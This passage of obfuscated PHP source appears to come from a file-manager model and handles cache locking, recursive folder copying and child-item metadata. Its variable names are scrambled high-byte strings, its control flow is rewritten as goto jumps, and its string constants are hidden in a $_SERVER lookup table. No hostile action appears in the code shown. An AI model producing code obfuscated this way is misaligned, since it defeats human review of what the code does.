$Bâ¬ïÚâ¿ . $dšä‹Ë•Ä[91] . $f§Ëˆƒ ±±, $b¡¦¦—ªæö); $this->_lockEvent($Bâ¬ïÚâ¿, array($dšä‹Ë•Ä[490], $dšä‹Ë•Ä[492]), $b¡¦¦—ªæö); goto F¿ŸóŸÙöô; F¿ŸóŸÙöô: $this->_lockParent($Bâ¬ïÚâ¿, array($dšä‹Ë•Ä[490], $dšä‹Ë•Ä[492]), $b¡¦¦—ªæö); $this->_lockCheckEnd($dšä‹Ë•Ä[491], $Bâ¬ïÚâ¿); goto EİĞìó¹ˆ; DÒàíùæÕ: $dšä‹Ë•Ä =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->allowLock()) { return; } $this->_lockCheck($dšä‹Ë•Ä[491], $Bâ¬ïÚâ¿); goto b¨Æ š¥ŒÈ; EİĞìó¹ˆ: } public function lockWriteEnd($cÈˆÖÉ‚, $C©Á¨Äß–± = '') { $AÛˆ‚óÇ” =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->allowLock()) { return; } $eáôÉÖ•¥ = 0; $this->_lockKey($AÛˆ‚óÇ”[495] . $cÈˆÖÉ‚ . $AÛˆ‚óÇ”[91] . $C©Á¨Äß–±, $eáôÉÖ•¥); $this->_lockEvent($cÈˆÖÉ‚, array($AÛˆ‚óÇ”[490], $AÛˆ‚óÇ”[492]), $eáôÉÖ•¥); $this->_lockParent($cÈˆÖÉ‚, array($AÛˆ‚óÇ”[490], $AÛˆ‚óÇ”[492]), $eáôÉÖ•¥); } public function lockMoveStart($f‰™É–Œ¯) { goto E«šääÁ•; FĞÉÄÀøê©: $this->_lockParent($f‰™É–Œ¯, array($CßÆÙÜ­Ş‡[490], $CßÆÙÜ­Ş‡[492]), $CƒÆ‰‡„¾™); $this->_lockEvent($f‰™É–Œ¯, array($CßÆÙÜ­Ş‡[497], $CßÆÙÜ­Ş‡[493], $CßÆÙÜ­Ş‡[494]), $CƒÆ‰‡„¾™); $this->_lockCheckEnd($CßÆÙÜ­Ş‡[492], $f‰™É–Œ¯); goto F‡ø„œö¤; E«šääÁ•: $CßÆÙÜ­Ş‡ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->allowLock()) { return; } $this->_lockCheck($CßÆÙÜ­Ş‡[492], $f‰™É–Œ¯); goto cºöÒ’âå; cºöÒ’âå: $CƒÆ‰‡„¾™ = 1; $this->_lockKey($CßÆÙÜ­Ş‡[496] . $f‰™É–Œ¯, $CƒÆ‰‡„¾™); $this->_lockEvent($f‰™É–Œ¯, array($CßÆÙÜ­Ş‡[490], $CßÆÙÜ­Ş‡[491]), $CƒÆ‰‡„¾™); goto FĞÉÄÀøê©; F‡ø„œö¤: } public function lockMoveEnd($Fá½ö†®ìğ) { goto BˆÀ®Ö†‡Á; DÎ‰­©´Æ: $this->_lockEvent($Fá½ö†®ìğ, array($bíÉÊ„÷‡É[497], $bíÉÊ„÷‡É[493], $bíÉÊ„÷‡É[494]), $f§åš”ØË‰); goto a¸ÀøŠ¬¾¯; F²ñªŒ°: $this->_lockKey($bíÉÊ„÷‡É[496] . $Fá½ö†®ìğ, $f§åš”ØË‰); $this->_lockEvent($Fá½ö†®ìğ, array($bíÉÊ„÷‡É[490], $bíÉÊ„÷‡É[491]), $f§åš”ØË‰); $this->_lockParent($Fá½ö†®ìğ, array($bíÉÊ„÷‡É[490], $bíÉÊ„÷‡É[492]), $f§åš”ØË‰); goto DÎ‰­©´Æ; BˆÀ®Ö†‡Á: $bíÉÊ„÷‡É =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->allowLock()) { return; } $f§åš”ØË‰ = 0; goto F²ñªŒ°; a¸ÀøŠ¬¾¯: } private function _lockCheck($f¤ŒÊ²ÒÁ¨, $bœŸÑÑÔƒ¡) { goto CÇ‹äáˆÑî; CÇ‹äáˆÑî: $f»öšÉÑå¨ =& $_SERVER[¼€¼ˆ¦‚¡]; $aè…ôò…ù = $this->sourceInfo($bœŸÑÑÔƒ¡); $F ÉÁ¢µ× = $f¤ŒÊ²ÒÁ¨ . $f»öšÉÑå¨[91] . $bœŸÑÑÔƒ¡; goto dĞÑ™¬ì°ß; dĞÑ™¬ì°ß: $this->_lockTimeStart[$F ÉÁ¢µ×] = timeFloat(); if (!is_array($aè…ôò…ù)) { return; } $báÊÕï—¤Ô = LNG($f»öšÉÑå¨[498]); goto cĞ¡ƒÚÅ™Œ; cĞ¡ƒÚÅ™Œ: CacheLock::setErrorMsg($f»öšÉÑå¨[157] . htmlspecialchars($aè…ôò…ù[$f»öšÉÑå¨[28]]) . $f»öšÉÑå¨[476] . $báÊÕï—¤Ô); $this->_lockKey($F ÉÁ¢µ×, 1); $this->_lockKey($F ÉÁ¢µ×, 0); goto c¸™“ºÇù’; c¸™“ºÇù’: $aÔ‡ÌŒ©·„ = array_reverse($this->parentLevelArray($aè…ôò…ù[$f»öšÉÑå¨[459]])); foreach ($aÔ‡ÌŒ©·„ as $F«§Ú—×„‚) { $F ÉÁ¢µ× = $f¤ŒÊ²ÒÁ¨ . $f»öšÉÑå¨[499] . $F«§Ú—×„‚; if (CacheLock::lockGet($f»öšÉÑå¨[500] . $F ÉÁ¢µ×)) { $aè…ôò…ù = $this->sourceInfo($F«§Ú—×„‚); CacheLock::setErrorMsg($f»öšÉÑå¨[157] . htmlspecialchars($aè…ôò…ù[$f»öšÉÑå¨[28]]) . $f»öšÉÑå¨[476] . $báÊÕï—¤Ô); $this->_lockKey($F ÉÁ¢µ×, 1); $this->_lockKey($F ÉÁ¢µ×, 0); } } goto d¸ã½Î©êÅ; d¸ã½Î©êÅ: } private function _lockCheckEnd($cà”é™ÆÜ, $Cš‰¤ÖœÚÎ) { goto D¢ƒ½ì§£; AŞ£ãÊ¦‡Ş: if (!isset($this->_lockTimeStart[$EóŠòç™î])) { return; } $CŞ³§‰ŠèĞ = timeFloat() - $this->_lockTimeStart[$EóŠòç™î]; unset($this->_lockTimeStart[$EóŠòç™î]); goto Bõ‹İ›Ÿ™¼; Bõ‹İ›Ÿ™¼: if ($CŞ³§‰ŠèĞ > 0.5) { unset(self::$cacheSourceInfo[$F¿ïĞ±±Ä[410] . $Cš‰¤ÖœÚÎ]); } $E±Ğï—ĞøÖ = $this->sourceInfo($Cš‰¤ÖœÚÎ); if (!$E±Ğï—ĞøÖ) { show_json(LNG($F¿ïĞ±±Ä[101]), !1); } goto eéƒ—«ê­®; D¢ƒ½ì§£: $F¿ïĞ±±Ä =& $_SERVER[¼€¼ˆ¦‚¡]; $EóŠòç™î = $cà”é™ÆÜ . $F¿ïĞ±±Ä[91] . $Cš‰¤ÖœÚÎ; CacheLock::setErrorMsg($F¿ïĞ±±Ä[361]); goto AŞ£ãÊ¦‡Ş; eéƒ—«ê­®: } private function _lockParent($aÈº°Ô×‘µ, $A’¡¶ô¤Ë, $A«â‰‚õ„‰) { if (!$this->autoLockSet) { return; } $f…å°Ù…ºÓ = $this->sourceInfo($aÈº°Ô×‘µ); if (!is_array($f…å°Ù…ºÓ)) { return; } $f¦õÑ‚î  = array_reverse($this->parentLevelArray($f…å°Ù…ºÓ[$_SERVER[¼€¼ˆ¦‚¡][459]])); foreach ($f¦õÑ‚î  as $BøœÙ„¯²¦) { $this->_lockEvent($BøœÙ„¯²¦, $A’¡¶ô¤Ë, $A«â‰‚õ„‰); } } private function _lockEvent($CÇí˜¬¦÷Ñ, $f»Ûá…ƒ, $E©½‹•´ƒ) { $AÙŠ§¬¦ß© =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->autoLockSet) { return; } foreach ($f»Ûá…ƒ as $d¨ø¤÷¤ù¿) { $F±ÀàÔî‹¥ = $d¨ø¤÷¤ù¿ . $AÙŠ§¬¦ß©[91] . $CÇí˜¬¦÷Ñ; if ($E©½‹•´ƒ && CacheLock::lockGet($AÙŠ§¬¦ß©[500] . $F±ÀàÔî‹¥)) { continue; } $this->_lockKey($F±ÀàÔî‹¥, $E©½‹•´ƒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Cˆ¡‘ã‡ê, $dŒ¶ŸÔÏ¤ = 1) { $A÷„ëÚšÁ¾ = $_SERVER[¼€¼ˆ¦‚¡][500] . md5($Cˆ¡‘ã‡ê); if ($dŒ¶ŸÔÏ¤) { if (isset(self::$_lockItemArr[$A÷„ëÚšÁ¾])) { return; } self::$_lockItemArr[$A÷„ëÚšÁ¾] = 1; CacheLock::lock($A÷„ëÚšÁ¾, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$A÷„ëÚšÁ¾])) { return; } unset(self::$_lockItemArr[$A÷„ëÚšÁ¾]); CacheLock::unlock($A÷„ëÚšÁ¾); } } public function isParentOf($C°“Ó£‹ëó, $BÇ‰Œ¼õ•) { goto BŠ‘‡Ò«“¥; fÎ†›Î¢¼: return $DŠ¬”Ã¡ÙÑ; goto EŒÆ»èƒñ; BŠ‘‡Ò«“¥: $F‰öŸÒ£¤Ğ =& $_SERVER[¼€¼ˆ¦‚¡]; $E¬Ş‹¿«ö = $this->sourceInfo($C°“Ó£‹ëó); $c„„ÔŸØ® = $this->sourceInfo($BÇ‰Œ¼õ•); goto AÊ†Ù«å§; AÊ†Ù«å§: $E³øÜËğù¤ = $E¬Ş‹¿«ö[$F‰öŸÒ£¤Ğ[459]] . $E¬Ş‹¿«ö[$F‰öŸÒ£¤Ğ[369]] . $F‰öŸÒ£¤Ğ[47]; $Dæ¼´Ê¤‹· = $c„„ÔŸØ®[$F‰öŸÒ£¤Ğ[459]] . $c„„ÔŸØ®[$F‰öŸÒ£¤Ğ[369]] . $F‰öŸÒ£¤Ğ[47]; $DŠ¬”Ã¡ÙÑ = strpos($Dæ¼´Ê¤‹·, $E³øÜËğù¤) === 0; goto fÎ†›Î¢¼; EŒÆ»èƒñ: } private $targetIsDelete = 0; public function copy($eĞ™™¢¬ø‘, $F÷ æ¤²‘á, $Eèä’„ëòÙ = REPEAT_REPLACE, $Bƒ•ÄÆî†Á = '') { goto D¦×Şä˜µ²; Bæô¥…šñ: if ($FõŞ»Ö“â[$EÈÈÔ·ƒˆ[370]] == $EÈÈÔ·ƒˆ[83] && $f¶¯ËÌ¶è’ == $dç‰çñá‘) { $this->folderSizeResetChildren($f¶¯ËÌ¶è’); } Model($EÈÈÔ·ƒˆ[504])->addAll($fá–¦ïŸè[$EÈÈÔ·ƒˆ[502]], array(), !0); if ($f¶¯ËÌ¶è’ != $dç‰çñá‘ || $FõŞ»Ö“â[$EÈÈÔ·ƒˆ[370]] == $EÈÈÔ·ƒˆ[83]) { Model($EÈÈÔ·ƒˆ[505])->eventCopy($dç‰çñá‘); } goto Bªæ¼Š†õ½; D‰…“ëÔñ: $this->_childrenListClear(); $this->lockCopyEnd($eĞ™™¢¬ø‘); $this->lockWriteEnd($F÷ æ¤²‘á, $F¾†àù©¦—); goto Bæô¥…šñ; C²ˆ°ÖÔâ‰: $this->lockCopyStart($eĞ™™¢¬ø‘); $this->lockWriteStart($F÷ æ¤²‘á, $F¾†àù©¦—); $fá–¦ïŸè = array($EÈÈÔ·ƒˆ[501] => array(), $EÈÈÔ·ƒˆ[502] => array(), $EÈÈÔ·ƒˆ[503] => array()); goto aœ•ß¿£†; c„½·ŞÑÇƒ: $this->updateModifyTime($F÷ æ¤²‘á); return $dç‰çñá‘; goto dÓ­ßÑ‘ÑÁ; aœ•ß¿£†: $this->targetIsDelete = intval($FõŞ»Ö“â[$EÈÈÔ·ƒˆ[397]]); $f¶¯ËÌ¶è’ = $this->fileNameExistCache($F÷ æ¤²‘á, $FõŞ»Ö“â[$EÈÈÔ·ƒˆ[28]]); $dç‰çñá‘ = $this->_copy($eĞ™™¢¬ø‘, $F÷ æ¤²‘á, $Eèä’„ëòÙ, $fá–¦ïŸè, !0, $Bƒ•ÄÆî†Á); goto D‰…“ëÔñ; B¬®Ô‹˜Í: if (!$FõŞ»Ö“â || !$A„ÉÙ­öŠÌ || $A„ÉÙ­öŠÌ[$EÈÈÔ·ƒˆ[370]] != $EÈÈÔ·ƒˆ[83]) { return !1; } if ($this->isParentOf($eĞ™™¢¬ø‘, $F÷ æ¤²‘á)) { return !1; } $F¾†àù©¦— = $Bƒ•ÄÆî†Á ? $Bƒ•ÄÆî†Á : $FõŞ»Ö“â[$EÈÈÔ·ƒˆ[28]]; goto C²ˆ°ÖÔâ‰; Bªæ¼Š†õ½: $this->saveAll($fá–¦ïŸè[$EÈÈÔ·ƒˆ[503]]); Model($EÈÈÔ·ƒˆ[167])->linkAdd($fá–¦ïŸè[$EÈÈÔ·ƒˆ[501]]); $this->folderSizeReset($F÷ æ¤²‘á); goto c„½·ŞÑÇƒ; D¦×Şä˜µ²: $EÈÈÔ·ƒˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $FõŞ»Ö“â = $this->sourceInfo($eĞ™™¢¬ø‘); $A„ÉÙ­öŠÌ = $this->sourceInfo($F÷ æ¤²‘á); goto B¬®Ô‹˜Í; dÓ­ßÑ‘ÑÁ: } private function _copy($E§°«’´Å, $BÇ»Ã‡¸‰•, $b†ÕÁ¥ó , &$f‘‹ğ¹ÙïÛ, $dˆÓèÌ‰Æº, $dƒ¦ŸÍÂ³ƒ = '') { goto eÎ•øÜÛ¢; dÒ¥§ĞçÈ…: if (!$d’·Ê•Î‘) { return $this->_copyCreate($E§°«’´Å, $BÇ»Ã‡¸‰•, $F³”‹õÙöÊ, $f‘‹ğ¹ÙïÛ); } $c¾ÅñÄ×ñ = $d’·Ê•Î‘; if ($E¶ÇÌ‘öíã) { if ($b†ÕÁ¥ó  == REPEAT_RENAME_FOLDER) { $F³”‹õÙöÊ = $this->fileNameAutoCache($BÇ»Ã‡¸‰•, $F³”‹õÙöÊ, $b†ÕÁ¥ó , $E¶ÇÌ‘öíã); $c¾ÅñÄ×ñ = $this->_copyCreate($E§°«’´Å, $BÇ»Ã‡¸‰•, $F³”‹õÙöÊ, $f‘‹ğ¹ÙïÛ); } else { $c±ô­Şß¾ = $this->_childrenList($E§°«’´Å); foreach ($c±ô­Şß¾ as $CŠ§ƒİ¬âË) { $this->_copy($CŠ§ƒİ¬âË[$E³ÑõµÁ…‰[369]], $d’·Ê•Î‘, $b†ÕÁ¥ó , $f‘‹ğ¹ÙïÛ, !1); } } } else { if ($b†ÕÁ¥ó  == REPEAT_RENAME || $b†ÕÁ¥ó  == REPEAT_RENAME_FOLDER) { $F³”‹õÙöÊ = $this->fileNameAutoCache($BÇ»Ã‡¸‰•, $F³”‹õÙöÊ, $b†ÕÁ¥ó , $E¶ÇÌ‘öíã); $c¾ÅñÄ×ñ = $this->_copyCreate($E§°«’´Å, $BÇ»Ã‡¸‰•, $F³”‹õÙöÊ, $f‘‹ğ¹ÙïÛ); } else { if ($b†ÕÁ¥ó  == REPEAT_REPLACE) { $bßËì×è¾ï = $this->sourceInfoCache($d’·Ê•Î‘); $e©ãç¬ó“Š = $this->fileHistory($bßËì×è¾ï, $dçö²½éè[$E³ÑõµÁ…‰[419]], $dçö²½éè[$E³ÑõµÁ…‰[77]]); if ($e©ãç¬ó“Š) { $f‘‹ğ¹ÙïÛ[$E³ÑõµÁ…‰[501]][] = $dçö²½éè[$E³ÑõµÁ…‰[419]]; } } else { if ($b†ÕÁ¥ó  == REPEAT_SKIP) { } } } Hook::trigger($E³ÑõµÁ…‰[506], array($E³ÑõµÁ…‰[507], $dçö²½éè, 0)); } goto c¦±É¯ˆÍ; F¾±ö¢ÇÉß: $F³”‹õÙöÊ = $dƒ¦ŸÍÂ³ƒ ? $dƒ¦ŸÍÂ³ƒ : $dçö²½éè[$E³ÑõµÁ…‰[28]]; $d’·Ê•Î‘ = $this->fileNameExistCache($BÇ»Ã‡¸‰•, $F³”‹õÙöÊ); if ($dˆÓèÌ‰Æº) { $this->_childrenAllMake($E§°«’´Å); if ($E¶ÇÌ‘öíã && $d’·Ê•Î‘) { $this->_childrenAllMake($d’·Ê•Î‘); } } goto dÒ¥§ĞçÈ…; eÎ•øÜÛ¢: $E³ÑõµÁ…‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $dçö²½éè = $this->sourceInfoCache($E§°«’´Å); $E¶ÇÌ‘öíã = $dçö²½éè[$E³ÑõµÁ…‰[370]] == $E³ÑõµÁ…‰[83]; goto F¾±ö¢ÇÉß; c¦±É¯ˆÍ: return $c¾ÅñÄ×ñ; goto a°œ¾Ïµ¹•; a°œ¾Ïµ¹•: } private function _copyCreate($Bœï¦İ†”ò, $BÓ†à ºù÷, $D¾ï¤†æ…‰, &$b’­¢•ùĞ) { goto DÆ‘¦Œƒ•Ä; dáã·“ë…: $DÇ·œæË°º = $this->add($BÔ ½ÊÄÓÒ); $FÉëßíƒÅ = array($DÃŒ·Ç´îÙ[369] => $DÇ·œæË°º, $DÃŒ·Ç´îÙ[28] => $D¾ï¤†æ…‰); $this->_copyApplyMeta($FÉëßíƒÅ, $b’­¢•ùĞ); goto f­¯à„œ¡; f®¥š£Œ˜Ê: foreach ($c…×ËìïÖø as $e‘ë¿ÜÁ½õ) { $fÃ·“»åõï = $e‘ë¿ÜÁ½õ[$DÃŒ·Ç´îÙ[369]]; $f’Í—‚Û²“ = $this->_childrenMatch($a… ¸«œ”¶, $e‘ë¿ÜÁ½õ, $Dï‡”£İÏ); $aËÜˆ­õ‰ë[] = array($DÃŒ·Ç´îÙ[369], $fÃ·“»åõï, $DÃŒ·Ç´îÙ[461], $f’Í—‚Û²“[$DÃŒ·Ç´îÙ[461]]); $bÆ¶ìµÕçÓ[] = array($DÃŒ·Ç´îÙ[369], $fÃ·“»åõï, $DÃŒ·Ç´îÙ[459], $f’Í—‚Û²“[$DÃŒ·Ç´îÙ[459]]); $this->_copyApplyMeta($e‘ë¿ÜÁ½õ, $b’­¢•ùĞ); if ($e‘ë¿ÜÁ½õ[$DÃŒ·Ç´îÙ[370]] != $DÃŒ·Ç´îÙ[83]) { $b’­¢•ùĞ[$DÃŒ·Ç´îÙ[501]][] = $e‘ë¿ÜÁ½õ[$DÃŒ·Ç´îÙ[419]]; } } $this->chunkEventSet($DÃŒ·Ç´îÙ[513], array($DÃŒ·Ç´îÙ[514], $BÔ ½ÊÄÓÒ, $D ±‹ªö¡)); $this->saveAll($aËÜˆ­õ‰ë); goto fš¦Ô­ùº¡; f¬äà¥Ç½Á: $Dï‡”£İÏ = $this->sourceInfo($DÇ·œæË°º); foreach ($FªõåƒÒË¶ as $e‘ë¿ÜÁ½õ) { $C‹‚â­·“ö = $this->_makeItemData($e‘ë¿ÜÁ½õ, $Dï‡”£İÏ, $e‘ë¿ÜÁ½õ[$DÃŒ·Ç´îÙ[28]]); $C‹‚â­·“ö[$DÃŒ·Ç´îÙ[459]] = $e‘ë¿ÜÁ½õ[$DÃŒ·Ç´îÙ[459]]; $FÊÀ¡Í°ã[] = $C‹‚â­·“ö; } $this->chunkEventSet($DÃŒ·Ç´îÙ[511], array($DÃŒ·Ç´îÙ[512], $BÔ ½ÊÄÓÒ, $D ±‹ªö¡)); goto c¾¹‰í¯¹£; bá‘¹ÂÎ¬: $BÔ ½ÊÄÓÒ = $this->_makeItemData($CŞÃÚ•…¬æ, $FÁÉ°¸¨î, $D¾ï¤†æ…‰); Hook::trigger($DÃŒ·Ç´îÙ[508], $BÔ ½ÊÄÓÒ); Hook::trigger($DÃŒ·Ç´îÙ[509], array($DÃŒ·Ç´îÙ[510], $BÔ ½ÊÄÓÒ, 0)); goto dáã·“ë…; c¾¹‰í¯¹£: $this->addAll($FÊÀ¡Í°ã, array(), !1); $c…×ËìïÖø = $this->where(array($DÃŒ·Ç´îÙ[461] => $DÇ·œæË°º))->select(); $a… ¸«œ”¶ = $this->_childrenMakeRelation($FªõåƒÒË¶, $c…×ËìïÖø); goto bªŒ¿À‹Ú; f­¯à„œ¡: if ($CŞÃÚ•…¬æ[$DÃŒ·Ç´îÙ[370]] != $DÃŒ·Ç´îÙ[83]) { $b’­¢•ùĞ[$DÃŒ·Ç´îÙ[501]][] = $CŞÃÚ•…¬æ[$DÃŒ·Ç´îÙ[419]]; return $DÇ·œæË°º; } $FªõåƒÒË¶ = array(); $FÊÀ¡Í°ã = array(); goto fÆšÖ¸; DÆ‘¦Œƒ•Ä: $DÃŒ·Ç´îÙ =& $_SERVER[¼€¼ˆ¦‚¡]; $CŞÃÚ•…¬æ = $this->sourceInfoCache($Bœï¦İ†”ò); $FÁÉ°¸¨î = $this->sourceInfoCache($BÓ†à ºù÷); goto bá‘¹ÂÎ¬; bªŒ¿À‹Ú: $a… ¸«œ”¶[$Bœï¦İ†”ò] = $DÇ·œæË°º; $aËÜˆ­õ‰ë = array(); $bÆ¶ìµÕçÓ = array(); goto f®¥š£Œ˜Ê; fš¦Ô­ùº¡: $this->chunkEventSet($DÃŒ·Ç´îÙ[515], array($DÃŒ·Ç´îÙ[516], $BÔ ½ÊÄÓÒ, $D ±‹ªö¡)); $this->saveAll($bÆ¶ìµÕçÓ); return $DÇ·œæË°º; goto A§ Ò•…Á“; fÆšÖ¸: $this->_childrenListAll($Bœï¦İ†”ò, $FªõåƒÒË¶); $D ±‹ªö¡ = count($FªõåƒÒË¶); if ($D ±‹ªö¡ == 0) { return $DÇ·œæË°º; } goto f¬äà¥Ç½Á; A§ Ò•…Á“: } private function _childrenMakeRelation($BÓº¯Ğ„…Ã, $eÚà–šÍÙ) { $fŒ¼àÊ­‡Š =& $_SERVER[¼€¼ˆ¦‚¡]; $FÄØ•É©ã = array(); $bã¤ŒÈò = array(); foreach ($BÓº¯Ğ„…Ã as $eíîÆİ‹í) { $AæÈ«Ó¹öß = $eíîÆİ‹í[$fŒ¼àÊ­‡Š[28]] . $fŒ¼àÊ­‡Š[8] . $eíîÆİ‹í[$fŒ¼àÊ­‡Š[459]]; $FÄØ•É©ã[$AæÈ«Ó¹öß] = $eíîÆİ‹í[$fŒ¼àÊ­‡Š[369]]; } foreach ($eÚà–šÍÙ as $eíîÆİ‹í) { $AæÈ«Ó¹öß = $eíîÆİ‹í[$fŒ¼àÊ­‡Š[28]] . $fŒ¼àÊ­‡Š[8] . $eíîÆİ‹í[$fŒ¼àÊ­‡Š[459]]; $F­„¹·óó¶ = $FÄØ•É©ã[$AæÈ«Ó¹öß]; $bã¤ŒÈò[$F­„¹·óó¶] = $eíîÆİ‹í[$fŒ¼àÊ­‡Š[369]]; } return $bã¤ŒÈò; } private function _childrenMatch($AºˆŒİÕñ, $C¥‡ÀÀ½¶, $EÕÛ‡½À¬ß) { goto D®ª¸Š¹˜Ê; e›¶ÑğâÑ£: $DìÍˆö×í = $f®ˆ“ºö¡[count($f®ˆ“ºö¡) - 1]; return array($EÓ›òÌ•Í[461] => $DìÍˆö×í, $EÓ›òÌ•Í[459] => $eÓ¯’ÔÚ½); goto bš´ğÕ—¯¤; A¢ùìõóº: foreach ($dÓ»ôƒøÖ² as $C“è¦‚ù‰‹) { if (isset($AºˆŒİÕñ[$C“è¦‚ù‰‹])) { $eÓ¯’ÔÚ½ .= $AºˆŒİÕñ[$C“è¦‚ù‰‹] . $EÓ›òÌ•Í[517]; } } $eÓ¯’ÔÚ½ = rtrim($eÓ¯’ÔÚ½, $EÓ›òÌ•Í[47]) . $EÓ›òÌ•Í[47]; $f®ˆ“ºö¡ = $this->parentLevelArray($eÓ¯’ÔÚ½); goto e›¶ÑğâÑ£; D®ª¸Š¹˜Ê: $EÓ›òÌ•Í =& $_SERVER[¼€¼ˆ¦‚¡]; $eÓ¯’ÔÚ½ = $EÕÛ‡½À¬ß[$EÓ›òÌ•Í[459]]; $dÓ»ôƒøÖ² = $this->parentLevelArray($C¥‡ÀÀ½¶[$EÓ›òÌ•Í[459]]); goto A¢ùìõóº; bš´ğÕ—¯¤: } private function _makeItemData($bò³Á¦…ƒ­, $a¿ö—˜ã°½, $AŒ…öĞš) { $dŒ¸³ìºİ² =& $_SERVER[¼€¼ˆ¦‚¡]; $E‚œ½Ó„”ë = array($dŒ¸³ìºİ²[518] => $bò³Á¦…ƒ­[$dŒ¸³ìºİ²[370]], $dŒ¸³ìºİ²[386] => $AŒ…öĞš, $dŒ¸³ìºİ²[519] => $bò³Á¦…ƒ­[$dŒ¸³ìºİ²[372]], $dŒ¸³ìºİ²[420] => $bò³Á¦…ƒ­[$dŒ¸³ìºİ²[419]], $dŒ¸³ìºİ²[520] => $bò³Á¦…ƒ­[$dŒ¸³ìºİ²[77]], $dŒ¸³ìºİ²[521] => $a¿ö—˜ã°½[$dŒ¸³ìºİ²[371]], $dŒ¸³ìºİ²[522] => $a¿ö—˜ã°½[$dŒ¸³ìºİ²[456]], $dŒ¸³ìºİ²[523] => USER_ID, $dŒ¸³ìºİ²[524] => USER_ID, $dŒ¸³ìºİ²[368] => $a¿ö—˜ã°½[$dŒ¸³ìºİ²[369]], $dŒ¸³ìºİ²[525] => $a¿ö—˜ã°½[$dŒ¸³ìºİ²[459]] . $a¿ö—˜ã°½[$dŒ¸³ìºİ²[369]] . $dŒ¸³ìºİ²[47], $dŒ¸³ìºİ²[396] => 0, $dŒ¸³ìºİ²[526] => $dŒ¸³ìºİ²[33]); return $E‚œ½Ó„”ë; } private function _copyApplyMeta($BÉİ¤Ì«ìµ, &$F·–Ó£ƒçÙ) { $bÄæñˆùç‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $B¿‚ãºÌ¥‡ = $BÉİ¤Ì«ìµ[$bÄæñˆùç‚[369]]; $b˜Ì“÷œ¼« = $BÉİ¤Ì«ìµ[$bÄæñˆùç‚[28]]; if (!isset($BÉİ¤Ì«ìµ[$bÄæñˆùç‚[527]]) || !$BÉİ¤Ì«ìµ[$bÄæñˆùç‚[527]] || $BÉİ¤Ì«ìµ[$bÄæñˆùç‚[527]] == $bÄæñˆùç‚[468]) { $F·–Ó£ƒçÙ[$bÄæñˆùç‚[503]][] = array($bÄæñˆùç‚[369], $B¿‚ãºÌ¥‡, $bÄæñˆùç‚[527], short_id($B¿‚ãºÌ¥‡)); } if (Input::check($b˜Ì“÷œ¼«, $bÄæñˆùç‚[528])) { $F·–Ó£ƒçÙ[$bÄæñˆùç‚[502]][] = array($bÄæñˆùç‚[369] => $B¿‚ãºÌ¥‡, $bÄæñˆùç‚[89] => $bÄæñˆùç‚[416], $bÄæñˆùç‚[359] => str_replace($bÄæñˆùç‚[50], $bÄæñˆùç‚[33], Pinyin::encode($b˜Ì“÷œ¼«))); $F·–Ó£ƒçÙ[$bÄæñˆùç‚[502]][] = array($bÄæñˆùç‚[369] => $B¿‚ãºÌ¥‡, $bÄæñˆùç‚[89] => $bÄæñˆùç‚[415], $bÄæñˆùç‚[359] => Pinyin::encode($b˜Ì“÷œ¼«, $bÄæñˆùç‚[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Fõ›ÜÁİ£) { goto B½‚×ôç¨‡; aª å›Ìì¨: $eÒóÕ°„ßè = array_to_keyvalue($eÒóÕ°„ßè, $f„ÇÏÏé [369]); foreach ($eÒóÕ°„ßè as $bÜ×æİÆÅ) { $eŠ†µÖ…ô„ = $bÜ×æİÆÅ[$f„ÇÏÏé [461]]; $Fõ›ÜÁİ£ = $bÜ×æİÆÅ[$f„ÇÏÏé [369]]; if (!isset($this->_childrenListCache[$Fõ›ÜÁİ£]) && $bÜ×æİÆÅ[$f„ÇÏÏé [370]] == $f„ÇÏÏé [83]) { $this->_childrenListCache[$Fõ›ÜÁİ£] = array(); } if (!isset($this->_childrenListCache[$eŠ†µÖ…ô„])) { $this->_childrenListCache[$eŠ†µÖ…ô„] = array(); } $this->_childrenListCache[$eŠ†µÖ…ô„][$Fõ›ÜÁİ£] = $bÜ×æİÆÅ; $this->_childrenItemCache[$Fõ›ÜÁİ£] = $bÜ×æİÆÅ; } goto bŠğÉ­‘Æ; FÖ—‚‹Ô: $AÅĞ‘­¡—æ = array($f„ÇÏÏé [459] => array($f„ÇÏÏé [483], $cÁ÷¢‹Ò¿[$f„ÇÏÏé [459]] . $Fõ›ÜÁİ£ . $f„ÇÏÏé [484]), $f„ÇÏÏé [397] => $this->targetIsDelete); $eÒóÕ°„ßè = $this->field($bæÙìª›š)->where($AÅĞ‘­¡—æ)->select(); if (!$eÒóÕ°„ßè) { return; } goto aª å›Ìì¨; B½‚×ôç¨‡: $f„ÇÏÏé  =& $_SERVER[¼€¼ˆ¦‚¡]; $cÁ÷¢‹Ò¿ = $this->sourceInfo($Fõ›ÜÁİ£); $bæÙìª›š = $f„ÇÏÏé [530]; goto FÖ—‚‹Ô; bŠğÉ­‘Æ: } private function _childrenListAll($b‘×”¥±, &$cãç²—ğˆ) { $eö™ƒ¦”±µ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($this->_childrenListCache[$b‘×”¥±])) { return; } $bÊŞÂ¥‚…« = $this->_childrenListCache[$b‘×”¥±]; foreach ($bÊŞÂ¥‚…« as $c¦Á«Œ¯¦ƒ => $Eí­¾ËŞô) { $cãç²—ğˆ[$c¦Á«Œ¯¦ƒ] = $Eí­¾ËŞô; if ($Eí­¾ËŞô[$eö™ƒ¦”±µ[370]] == $eö™ƒ¦”±µ[83]) { $this->_childrenListAll($c¦Á«Œ¯¦ƒ, $cãç²—ğˆ); } } } private function sourceInfoCache($EÑÀâ‹ØÔè) { if (isset($this->_childrenItemCache[$EÑÀâ‹ØÔè])) { return $this->_childrenItemCache[$EÑÀâ‹ØÔè]; } return $this->sourceInfo($EÑÀâ‹ØÔè); } private function _childrenList($dñÆôºòãí) { if (isset($this->_childrenListCache[$dñÆôºòãí])) { return $this->_childrenListCache[$dñÆôºòãí]; } return $this->_childrenListSelect($dñÆôºòãí); } private function _childrenListSelect($B¨âòƒµÑË) { goto dêÖ–³¹ëê; 